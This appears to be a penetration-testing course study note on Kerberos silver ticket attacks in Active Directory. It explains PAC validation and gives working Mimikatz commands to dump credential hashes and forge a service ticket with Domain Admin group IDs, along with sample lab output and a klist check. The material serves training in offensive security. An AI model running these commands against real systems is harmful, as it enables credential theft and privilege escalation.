# Overview
>The application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
>_Privileged Account Certificate_ (PAC)[1](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_225-1) validation[2](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_225-2) is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.
>As an example, if we authenticate against an IIS server that is executing in the context of the service account _iis_service_, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.
>With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a _silver ticket_[3](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_225-3) and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.


# Exploit
In general, we need to collect the following three pieces of information to create a silver ticket:
- SPN password hash
- Domain SID
- Target SPN

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# obtain the NTLM hash of the user account service
mimikatz # kerberos::golden /sid:<sid> /domain:<domain.local> /ptt /target:<target> /service:<service> /rc4:<hash> /user:<user>

# EXAMPLE
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

In the example, a new service ticket for the SPN _HTTP/web04.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above.
This means we should have the ticket ready to use in memory. We can confirm this with **klist**.

```powershell
# Listing Kerberos tickets to confirm the silver ticket is submitted to the current session
PS C:\Tools> klist
Current LogonId is 0:0xa04cc
Cached Tickets: (1)
#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

# Verify our access to the service
iwr -UseDefaultCredentials http://web04

```
